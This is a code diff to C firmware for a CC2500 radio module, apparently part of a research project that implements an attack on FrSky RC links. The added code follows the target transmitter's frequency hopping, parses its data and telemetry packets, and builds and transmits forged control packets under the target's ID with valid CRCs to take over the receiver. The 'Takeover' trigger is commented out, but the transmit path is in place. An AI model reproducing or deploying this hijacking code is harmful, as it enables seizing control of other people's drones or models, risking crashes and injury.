@@ -55,8 +55,11 @@ struct protocol_t protocol_frsky_hack = {
 /* Internal functions */
 static void protocol_frsky_hack_timer(void);
 static void protocol_frsky_hack_receive(uint8_t len);
+static void protocol_frsky_hack_send(uint8_t len);
 static void protocol_frsky_hack_next(void);
 static bool protocol_frsky_parse_data(uint8_t *packet);
+static bool protocol_frsky_parse_telem(uint8_t *packet);
+static void protocol_frsky_build_packet(void);
 
 /* Internal variables */
 static enum frsky_hack_state_t frsky_hack_state;										/**< The status of the hack */
@@ -66,6 +69,11 @@ static uint8_t frsky_hop_idx = 0;																		/**< The current hopping inde
 static uint8_t frsky_chanskip = 1;																	/**< Amount of channels to skip between each receive */
 static uint8_t frsky_target_id[2];																	/**< The target to hack */
 static uint8_t frsky_hop_table[FRSKY_HOP_TABLE_LENGTH];							/**< The hopping table of the target */
+static uint8_t succ_packets = 0;																		/**< Amount of succesfull packets received in a row */
+static uint8_t frsky_packet[FRSKY_PACKET_LENGTH_EU+5];							/**< Transmitting FrSky packet (EU is longest) */
+static uint32_t send_time = 0;
+static uint8_t send_seq = 0x8;
+static uint8_t recv_seq = 0;
 
 /**
  * Configure the CC2500 chip and antenna switcher
@@ -88,7 +96,7 @@ static void protocol_frsky_hack_init(void) {
 	// Set the callbacks
 	timer1_register_callback(protocol_frsky_hack_timer);
 	cc_register_recv_callback(protocol_frsky_hack_receive);
-	cc_register_send_callback(NULL);
+	cc_register_send_callback(protocol_frsky_hack_send);
 
 	console_print("\r\nFrSky Hack initialized 0x%02X 0x%02X", config.frsky_bind_id[0], config.frsky_bind_id[1]);
 }
@@ -99,19 +107,22 @@ static void protocol_frsky_hack_init(void) {
 static void protocol_frsky_hack_deinit(void) {
 	timer1_register_callback(NULL);
 	cc_register_recv_callback(NULL);
+	cc_register_send_callback(NULL);
 
 	console_print("\r\nFrSky Hack deinitialized");
 }
 
 /**
- * Configure the CYRF and start scanning
+ * Configure the CC2500 and start hacking
  */
 static void protocol_frsky_hack_start(void) {
 	cc_strobe(CC2500_SIDLE);
+	succ_packets = 0;
 
 	// Configure the CC2500
 	frsky_set_config(frsky_protocol);
 	cc_write_register(CC2500_MCSM0, 0x08);
+	cc_write_register(CC2500_MCSM1, 0x08);
   cc_write_register(CC2500_PKTCTRL1, CC2500_PKTCTRL1_APPEND_STATUS | CC2500_PKTCTRL1_CRC_AUTOFLUSH | CC2500_PKTCTRL1_FLAG_ADR_CHECK_01);
 
 	// Set the correct packet length (length + 2 status bytes appended)
@@ -184,48 +195,141 @@ static void protocol_frsky_hack_timer(void) {
 
 		/* Trying to synchronize with the transmitter */
 		case FRSKY_HACK_SYNC:
+			succ_packets = 0;
+			protocol_frsky_hack_next();
+			cc_strobe(CC2500_SFRX);
+			cc_strobe(CC2500_SRX);
+			timer1_set(FRSKY_RECV_TIME);
+			console_print("G");
+			break;
+
+		/* We missed a packet during receiving */
+		case FRSKY_HACK_RECV:
+			succ_packets = 0;
+			console_print("\r\nE %d %d", frsky_hop_idx, frsky_hop_table[frsky_hop_idx]);
 			protocol_frsky_hack_next();
 			cc_strobe(CC2500_SFRX);
 			cc_strobe(CC2500_SRX);
 			timer1_set(FRSKY_RECV_TIME);
 			break;
 
-		/* We missed a packet during receiving */
-		case FRSKY_HACK_RECV:
+		/* Sending and taking over control */
+		case FRSKY_HACK_SEND:
+			timer1_set(FRSKY_SEND_TIME-20);
+			cc_strobe(CC2500_SIDLE);
+			cc_set_mode(CC2500_TXRX_TX);
 			protocol_frsky_hack_next();
+			cc_set_power(5);
 			cc_strobe(CC2500_SFRX);
-			cc_strobe(CC2500_SRX);
-			timer1_set(FRSKY_RECV_TIME);
+
+			cc_strobe(CC2500_SIDLE);
+			protocol_frsky_build_packet();
+			cc_write_data(frsky_packet, frsky_packet[0]+1);	
 			break;
 	}
 	
 }
 
 static void protocol_frsky_hack_receive(uint8_t len) {
+	static uint8_t packet_len = 0;
+
+	/* Check if we receieved a packet length */
+	if(packet_len == 0) {
+		cc_read_data(&packet_len, 1);
+		len--;
+	}
+
 	/* Check if we received a full packet */
-	if(len < frsky_packet_length)
+	if(len < packet_len+2)
 		return;
 
-	uint8_t data[frsky_packet_length + 2];		// Added 2 bytes for PC transmission of channel and fsctrl0
-	cc_read_data(data, frsky_packet_length);
+	send_time = timer1_get_time();
+	uint32_t ticks = counter_status.ticks;
+	uint8_t data[packet_len + 3 + 2];		// Added 2 bytes for PC transmission of channel and fsctrl0
+	data[0] = packet_len;
+	cc_read_data(&data[1], packet_len+2);
+	packet_len = 0;
 
 	switch(frsky_hack_state) {
 		/* When receiving a data packet */
 		case FRSKY_HACK_SYNC:
 		case FRSKY_HACK_RECV:
-			// Check if the data packet is valid
+			// Check if the packet is a valid data packet
 			if(protocol_frsky_parse_data(data)) {
 				LED_TOGGLE(LED_RX);
 
-				frsky_hack_state = FRSKY_HACK_RECV;
-				protocol_frsky_hack_next();
-				cc_strobe(CC2500_SFRX);
-				timer1_set(FRSKY_RECV_TIME);
+				if(succ_packets < 200)
+					succ_packets++;
+
+				// Whenever there is no telemetry hop to the next channel (else wait for telemetry)
+				if(send_seq == 0x8) {
+					// if(succ_packets > 2) {
+					// 	frsky_hack_state = FRSKY_HACK_SEND;
+					// 	timer1_set(FRSKY_SEND_TIME-50);
+					// 	console_print("\r\nTakeover!");
+					// } else {
+						protocol_frsky_hack_next();
+						timer1_stop();
+						timer1_set(FRSKY_RECV_TIME);
+						frsky_hack_state = FRSKY_HACK_RECV;
+						console_print("\r\nR %d", ticks);
+					// }
+				}
+				// Wait for telemetry
+				else {
+					//protocol_frsky_hack_next();
+					timer1_stop();
+					timer1_set(FRSKY_TELEM_TIME); // Early timeout because telemetry isn't needed
+					frsky_hack_state = FRSKY_HACK_RECV;
+					console_print("\r\nA %d", ticks);
+				}
 			}
+			// Check if the packet is a valid telemetry packet
+			else if(protocol_frsky_parse_telem(data)) {
+				LED_TOGGLE(LED_RX);
+
+				if(succ_packets < 200)
+					succ_packets++;
+
+				console_print("\r\nT %d", ticks);
+				// if(succ_packets > 2) {
+				// 	frsky_hack_state = FRSKY_HACK_SEND;
+				// 	timer1_set(50);
+				// 	console_print("\r\nTakeover!");
+				// } else {
+					protocol_frsky_hack_next();
+					timer1_stop();
+					timer1_set(FRSKY_RECV_TIME);
+					frsky_hack_state = FRSKY_HACK_RECV;
+				// }
+			} else {
+				console_print("\r\nF %d", ticks);
+			}
+
+			// Start receiving again
+			cc_strobe(CC2500_SIDLE);
+			cc_strobe(CC2500_SFRX);
 			cc_strobe(CC2500_SRX);
 			break;
 
+		/* Receive telemetry if possible */
+		case FRSKY_HACK_SEND:
+			if(protocol_frsky_parse_telem(data)) {
+				LED_TOGGLE(LED_RX);
+				timer1_set(50); // Adjust timer based on received telemetry
+			}
+			else {
+				cc_strobe(CC2500_SFRX);
+				cc_strobe(CC2500_SRX);
+			}
+			break;
 	}
+}
+
+static void protocol_frsky_hack_send(uint8_t len __attribute__((unused))) {
+	cc_strobe(CC2500_SIDLE);
+	cc_set_mode(CC2500_TXRX_RX);
+	cc_strobe(CC2500_SRX);
 }
 
 /**
@@ -246,11 +350,55 @@ static void protocol_frsky_hack_next(void) {
  */
 static bool protocol_frsky_parse_data(uint8_t *packet) {
 	// Validate the packet length (without length and status bytes)
-	if(packet[0] != frsky_packet_length-3)
+	if(packet[0] != frsky_packet_length-3) {
+		//console_print("\r\nL1");
+		return false;
+	}
+
+	// Validate the CRC of the CC2500
+	if(!(packet[frsky_packet_length-1] & 0x80)) {
+		//console_print("\r\nL2");
+		return false;
+	}
+
+	// Validate the transmitter id
+	if(packet[1] != frsky_target_id[0] || packet[2] != frsky_target_id[1]) {
+		//console_print("\r\nL3");
+		return false;
+	}
+
+	// Validate the inner CRC for FrSkyX
+	if(frsky_protocol == FRSKYX_EU || frsky_protocol == FRSKYX) {
+		uint16_t calc_crc = frskyx_crc(&packet[3], frsky_packet_length-7);
+		uint16_t packet_crc = (packet[frsky_packet_length-4] << 8) | packet[frsky_packet_length-3];
+		if(calc_crc != packet_crc) {
+			//console_print("\r\nL4");
+			return false;
+		}
+	}
+
+	// Send the data to the PC
+	packet[frsky_packet_length+0] = frsky_hop_table[frsky_hop_idx];
+	packet[frsky_packet_length+1] = 0;
+	uint8_t chip_id = 1;
+	pprz_msg_send_RECV_DATA(&pprzlink.tp.trans_tx, &pprzlink.dev, 1, &chip_id, frsky_packet_length+2, packet);
+
+	// Update the channel skip and channel index based on received values
+	frsky_chanskip = (packet[4] >> 6) | (packet[5] << 2);
+	frsky_hop_idx = packet[4] & 0x3F;
+	send_seq = packet[21] & 0x0F;
+	recv_seq = packet[21] >> 4;
+
+	return true;
+}
+
+static bool protocol_frsky_parse_telem(uint8_t *packet) {
+	// Validate the packet length (without length and status bytes)
+	if(packet[0] != FRSKY_TELEM_LENGTH)
 		return false;
 
 	// Validate the CRC of the CC2500
-	if(!(packet[frsky_packet_length-1] & 0x80))
+	if(!(packet[FRSKY_TELEM_LENGTH+2] & 0x80))
 		return false;
 
 	// Validate the transmitter id
@@ -259,21 +407,73 @@ static bool protocol_frsky_parse_data(uint8_t *packet) {
 
 	// Validate the inner CRC for FrSkyX
 	if(frsky_protocol == FRSKYX_EU || frsky_protocol == FRSKYX) {
-		uint16_t calc_crc = frskyx_crc(&packet[3], frsky_packet_length-7);
-		uint16_t packet_crc = (packet[frsky_packet_length-4] << 8) | packet[frsky_packet_length-3];
+		uint16_t calc_crc = frskyx_crc(&packet[3], FRSKY_TELEM_LENGTH-4);
+		uint16_t packet_crc = (packet[FRSKY_TELEM_LENGTH-1] << 8) | packet[FRSKY_TELEM_LENGTH];
 		if(calc_crc != packet_crc)
 			return false;
 	}
 
 	// Send the data to the PC
-	packet[frsky_packet_length+0] = frsky_hop_table[frsky_hop_idx];
-	packet[frsky_packet_length+1] = config.cc_fsctrl0;
+	packet[FRSKY_TELEM_LENGTH+3] = frsky_hop_table[frsky_hop_idx];
+	packet[FRSKY_TELEM_LENGTH+4] = 0;
 	uint8_t chip_id = 1;
-	pprz_msg_send_RECV_DATA(&pprzlink.tp.trans_tx, &pprzlink.dev, 1, &chip_id, frsky_packet_length+2, packet);
+	pprz_msg_send_RECV_DATA(&pprzlink.tp.trans_tx, &pprzlink.dev, 1, &chip_id, FRSKY_TELEM_LENGTH+5, packet);
 
-	// Update the channel skip and channel index based on received values
-	frsky_chanskip = (packet[4] >> 6) | (packet[5] << 2);
-	frsky_hop_idx = packet[4] & 0x3F;
+	// Update information based on received telemetry
+	if((packet[5] & 0xF) == 0x8 || (packet[5] >> 4) == 0x8) {
+		recv_seq = 0x8;
+		send_seq = 0x0;
+	} else{
+		recv_seq = ((packet[5] & 0x03) + 1) % 4; // Ignore all failed packets and sequence information
+	}
 
 	return true;
+}
+
+/**
+ * Build the transmitting packet
+ */
+static void protocol_frsky_build_packet(void) {
+//[32, 143, 125, 4, 102, 1, 1, 0, 0, 0, 1, 192, 255, 3, 192, 0, 12, 192, 0, 12, 192, 49, 0, 0, 0, 0, 0, 0, 0, 0, 0, 241, 149, 11, 140, 28, 0]
+	static bool send_part2 = false;
+	frsky_packet[0] = frsky_packet_length-3;
+	frsky_packet[1] = frsky_target_id[0];
+	frsky_packet[2] = frsky_target_id[1];
+	frsky_packet[3] = 0x04;
+	frsky_packet[4] = (frsky_chanskip << 6) | frsky_hop_idx;
+	frsky_packet[5] = frsky_chanskip >> 2;
+	frsky_packet[6] = 1; // RX number
+	frsky_packet[7] = 0; // No failsafe values
+	frsky_packet[8] = 0;
+
+	for(uint8_t i = 0; i < 12; i += 3) {
+		uint16_t value0 = send_part2? 3900 : 1500;
+		uint16_t value1 = send_part2? 3900 : 1500;
+		frsky_packet[i + 9]  = value0;
+		frsky_packet[i + 10] = ((value0 >> 8) & 0xF) | (value1 << 4);
+		frsky_packet[i + 11]  = (value1 >> 4);
+	}
+
+	if(send_seq != 0x8){
+		send_seq = (send_seq + 1) & 0x03;
+		recv_seq |= 0x04;
+	}
+
+	frsky_packet[21] = (recv_seq << 4) | send_seq; // Sequence
+
+	for(uint8_t i = 22; i < frsky_packet_length-4; i++)
+		frsky_packet[i] = 0;
+
+	uint16_t crc = frskyx_crc(&frsky_packet[3], frsky_packet_length-7);
+	frsky_packet[frsky_packet_length-4] = crc >> 8;
+	frsky_packet[frsky_packet_length-3] = crc;
+
+	// DEBUG
+	frsky_packet[frsky_packet_length-2] = 0;
+	frsky_packet[frsky_packet_length-1] = 0x80;
+	frsky_packet[frsky_packet_length] = frsky_hop_table[frsky_hop_idx];
+	frsky_packet[frsky_packet_length+1] = 0;
+	send_part2 = !send_part2;
+	//uint8_t chip_id = 1;
+	//pprz_msg_send_RECV_DATA(&pprzlink.tp.trans_tx, &pprzlink.dev, 1, &chip_id, frsky_packet_length+2, frsky_packet);
 }
